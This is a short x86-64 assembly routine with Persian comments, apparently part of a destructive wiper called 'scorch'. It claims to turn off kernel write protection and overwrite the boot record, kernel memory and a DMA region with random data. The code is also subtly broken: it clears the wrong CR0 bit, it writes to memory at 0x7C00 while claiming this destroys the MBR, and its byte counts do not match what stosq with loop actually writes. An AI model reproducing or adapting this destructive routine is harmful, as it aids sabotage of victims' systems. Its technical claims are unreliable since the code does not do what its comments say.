%include "scorch_macros.inc"

global deep_mem_corrupt
deep_mem_corrupt:
    ; غیرفعال‌سازی حفاظت حافظه
    mov rax, cr0
    and rax, 0xFFFFFFFFFFFFFFF7 ; WP=0
    mov cr0, rax
    
    ; تخریب MBR و GPT
    mov rdi, 0x7C00      ; آدرس MBR
    mov rcx, 0x200       ; 512 بایت
    call fill_random
    
    ; تخریب حافظه کرنل
    mov rdi, [kernel_base]
    mov rcx, 0x1000000   ; 16 مگابایت
    call fill_random
    
    ; تخریب حافظه DMA
    mov rdi, 0x10000
    mov rcx, 0x10000
    call fill_random
    
    ; فعال‌سازی مجدد حفاظت
    mov rax, cr0
    or rax, 0x10000      ; WP=1
    mov cr0, rax
    ret

; پر کردن حافظه با داده‌های تصادفی
fill_random:
    rdrand rax
    stosq
    loop fill_random
    ret
    